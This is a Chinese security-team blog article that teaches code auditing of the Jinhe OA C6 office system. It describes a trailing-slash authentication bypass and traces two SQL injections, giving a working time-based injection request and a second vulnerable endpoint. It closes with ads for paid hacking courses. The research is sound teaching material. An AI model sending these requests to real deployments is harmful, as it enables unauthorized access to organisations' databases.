#  手把手教你审计金和OA系统漏洞   
原创 chobits02  Code4th安全团队   2025-02-11 23:45  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/EXTCGqBpVJQGQG6ibYpsQ9hibUNQ9JogaBM4ETcLDdyuTknYvxjLbGCEQFKUEwbwpummEIZzqUcA3Mhaj6yJqd9Q/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
  
金和OA C6系统是一款功能强大、应用广泛的协同管理平台。主要是由CSharp开发，打包成dll文件。在审计源码时候要使用dnspy之类的工具反编译源码进行审计。  
  
贴一张我之前的CNVD代码审计提交成果  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJT2YrFIN4ibUhvIBahrMGKp5qoyYkK2ZFLoLBVleSUpylN5yZQAPNxAnXfBp7gmC0ibmBUVn5ppoDRA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJT2YrFIN4ibUhvIBahrMGKp5uYvbu2yJeEoxn9BnE7lc0nJZOufPqFqUJKqIeOxhHRK68gauPOmeYQ/640?wx_fmt=png&from=appmsg "")  
  
这里随口唠叨一句，金和OA已经是非常古老的产物了，在我实习时就误打误撞拿到了备份的源码开启了我审计之旅，如今几年过去了金和OA无愧是代码审计的入门OA系统  
  
金和OA的源码和我对其代码审计的记录文档，已经放在团队的最新Freebuf知识大陆中，只是个红队内部小圈子  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJT2YrFIN4ibUhvIBahrMGKp5a3LJZtwaXaEHjsfNbTA6ImgdExDBYjMWEbnHyhgICuLibIgS0ibPAwAg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJT2YrFIN4ibUhvIBahrMGKp5CFeaxpLFd171rfw5K2F2NZwPR1CIeR8QafphBagK2kibty5WJgibm8Gw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJT2YrFIN4ibUhvIBahrMGKp5qQL3abianP8tvtPVicONcibxiapfBmUAZ9iapY4eOOWwZFDneMCeHqJ4szQ/640?wx_fmt=png&from=appmsg "")  
  
审计步骤文档和源码都已公开在知识大陆中  
  
  
从头开始，审计开始先要弄清楚入口在哪里  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJT2YrFIN4ibUhvIBahrMGKp5yI3HwfSy0celECFROUxhefHxibGkia3JdK3cR0wqSxUOo3KjzCVx6s3g/640?wx_fmt=png&from=appmsg "")  
  
登录页面路由为  
```
/c6/Jhsoft.Web.login/PassWordSlide.aspx
```  
  
找到对应的dll文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJT2YrFIN4ibUhvIBahrMGKp5PiaH2RaSe9ZTHhlzLTOnlNkrfSjUMkab66YqrrsXJibIJ0kib50WwU3sQ/640?wx_fmt=png&from=appmsg "")  
  
反编译一下能找到  
PassWordSlide类  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJT2YrFIN4ibUhvIBahrMGKp56PTfwibvoAc9Vm9zAw18juaicMjAd92jl8V475Z2IVVmYGsUg9pmo7iaw/640?wx_fmt=png&from=appmsg "")  
  
说明它的路由规则是/c6/+dll的文件名称+方法名称.aspx  
  
而且能访问到的也只是带有JHSoft.Web前缀的dll文件中的方法  
  
有没有办法能绕过鉴权访问到不同文件里面的方法呢？办法是有的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJT2YrFIN4ibUhvIBahrMGKp58Y9Gk7JibnYrAHBiafjDd6XHGB4Miah0KVzTibAcPHkSQG5GzayN1jSt3w/640?wx_fmt=png&from=appmsg "")  
> 文章 - .NET 某和OA办公系统全局绕过漏洞分析 - 先知社区  
  
> https://xz.aliyun.com/news/13954  
  
  
  
就像用友OA能用/~访问到任意的servlet方法，用com.ufida.web.action.ActionServlet方法能访问到任意的Action方法一样，金和OA也存在自身的逻辑漏洞，使用/就能达到访问任意方法的目的，甚至在后期修复时也没有完全解决这个问题，POST方法时用/.ashx仍能造成逻辑问题  
  
简单来审计一个SQL注入漏洞吧  
  
JHSoft.Web.IncentivePlan.dll文件中的IncentivePlanFulfill方法如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJT2YrFIN4ibUhvIBahrMGKp5iasfILPXMBCrmibDc8urnv5I8c62jPTGcTrsWjB2OnnUY3ylqxLNlmpQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJT2YrFIN4ibUhvIBahrMGKp5x306iaycr2H0vx0uA4FU4Jp0btQKBqOX9R4lFia5DGxM2yHJJA0dY1vA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJT2YrFIN4ibUhvIBahrMGKp5OIGFicaSwUSNvRjzdJFTMbXzZjlDibCzVz2mzeeI3XhYJLTSp2XgYF7Q/640?wx_fmt=png&from=appmsg "")  
  
其中IncentiveID一路追踪，最后直接拼接到了SQL语句中执行，造成SQL注入漏洞，很简单对吧，金和OA大大小小的SQL注入都差不多  
  
知道使用/能绕过权限验证，可以构造如下的POC  
```
GET /C6/JHSoft.Web.IncentivePlan/IncentivePlanFulfill.aspx/?IncentiveID=1%20WAITFOR%20DELAY%20'0:0:5'--&TVersion=1 HTTP/1.1
Host: your-ip
User-Agent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```  
  
验证一下延时注入了5秒  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJT2YrFIN4ibUhvIBahrMGKp51k6aPREoibib9Yic7rXs3Sq3hjJhdGOJh2MpVOAFs6XXhVlWOTpDicYs2w/640?wx_fmt=png&from=appmsg "")  
  
当然金和OA中也有不依赖逻辑漏洞的名副其实的漏洞  
  
路径如  
```
/c6/jhsoft.mobileapp/AndroidSevices/HomeService.asmx/GetHomeInfo
```  
  
HomeService为Webservice文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJT2YrFIN4ibUhvIBahrMGKp5tN64oX6YzgUv7Z9bmv49rZDScYA6gMgPjkHbcvibcrqO4mX3pCVc2lA/640?wx_fmt=png&from=appmsg "")  
  
  
jhsoft.mobileapp/AndroidSevices/HomeService.asmx/GetHomeInfo方法中，GetQuickUserInfo查询userID  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJT2YrFIN4ibUhvIBahrMGKp5P3aciaMY74YsaJap1k6Wpdn97YMy5W6eqqB0MAQUd0M7ibibgfw9t6Iug/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJT2YrFIN4ibUhvIBahrMGKp5XDajRVHyKKXlsfThiaAFS4mWSlel5icbWib6dzJITMYyZFsuqJPpLybxg/640?wx_fmt=png&from=appmsg "")  
  
来到抽象类ExecProcReDataTable继续追踪  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJT2YrFIN4ibUhvIBahrMGKp5qtTeVAxeic1JY8uKZmw87TaVOIRqI2QcicQWNXiacutY4gicxAx6IwsuIQ/640?wx_fmt=png&from=appmsg "")  
  
进入quickUserInfo判断条件  
  
由于quickUserInfo数组并不存在PhotoURL参数，text为空，进入判断MapAndFindFilebyRelativeFilePath方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJT2YrFIN4ibUhvIBahrMGKp5d00V4Q30kTt7j3e26QNBvkFozIHlxfjz5bv9V6cDicrNZZtjflMSZWA/640?wx_fmt=png&from=appmsg "")  
  
判断为false，text设为空，释放类quickUserInfo  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJT2YrFIN4ibUhvIBahrMGKp5EG524v23qWiblib3duPB5Z8fqd7v3DooSOk5zrWviaZick34w92UaPTMOw/640?wx_fmt=png&from=appmsg "")  
  
text为空进入条件string userSex = GetUserSex(userID);  
  
此处就可以看到userId拼接进了SQL语句中进行处理，造成了SQL注入  
```
string queryString = "select DossValue from dossiervalue a left join users b on a.RegCode=b.userid where a.DossierFieldID='3' and b.userid='" + userId + "'";
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJT2YrFIN4ibUhvIBahrMGKp5eWqQXattb16VUOphtSs8xAFJI5E2iaoLxiajS0vJ76lmVMPasjhV8Dgw/640?wx_fmt=png&from=appmsg "")  
  
最后poc也能知道了：  
```
http://XXXX/c6/jhsoft.mobileapp/AndroidSevices/HomeService.asmx/GetHomeInfo?userID=payload
```  
  
  
  
  
  
**每个初学挖洞的小白都有一个美梦**  
：是否可以在我学习挖洞技能的时候，有位师傅手把手指导，不仅教会我各种技术，还能带着我一起接项目挣钱，让我的技能和钱包同时“升级打怪”。  
  
    还真别说，现在这个天降大饼的美梦来了！  
FreeBuf  
知识大陆帮会《安全渗透感知大家族》，正好为你提供了这样的机会。在这里，你既能  
学到知识  
，又能  
做项目赚钱  
，还能在项目实践过程中与大佬们  
交流思路、夯实基础  
。  
  
[](http://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&mid=2651303102&idx=1&sn=6bd3abdb7109cc66aba29c207220abb3&chksm=bd1c3e358a6bb723efafa4f60e95a264aeea48508f9acef1444e8d5dded986457f046c39e3a2&scene=21#wechat_redirect)  
  
  
该**SRC漏洞挖掘出洞课程**  
，是由团队内部师傅根据实际挖洞经历整合的适合挖掘漏洞但是缺乏思路、刚接触学习漏洞挖掘不出漏洞的师傅们的漏洞挖掘教程。  
  
第一期课程价格  
199  
，这价格还要什么自行车？课程正在持续更新中~  
  
[](http://mp.weixin.qq.com/s?__biz=MzkzMzE5OTQzMA==&mid=2247485154&idx=1&sn=90f1bce91e53a5bf538bdef11fe15b2d&chksm=c2516dcbf526e4dd6d75254b70743d30902a7f0288d001148a41cc05e2d0b9fb09702d2ea03e&scene=21#wechat_redirect)  
  
  
**致远A8**  
，又称致远互联A8  
协同管理软件  
，是面向中型、大型、集团型组织（集团版OA）的数字化协同运营中台。A8版本的系统小版本较多，本次分析用的是致远A8 V7 SP1版本源码。  
  
[](http://mp.weixin.qq.com/s?__biz=MzkzMzE5OTQzMA==&mid=2247484688&idx=1&sn=928f50f70991a1979dcefb8d02cb02d6&chksm=c2516e39f526e72fae6fe053cf7ab537692bd5581a5552dfe7bfcee0588bd7e5c0d793f2f84b&scene=21#wechat_redirect)  
  
  
  
  
  
  
  
END  
  
  
  
关注Cod  
e4th安全团队  
  
了解更多安全相关内容~  
  
  
  
  
  
  
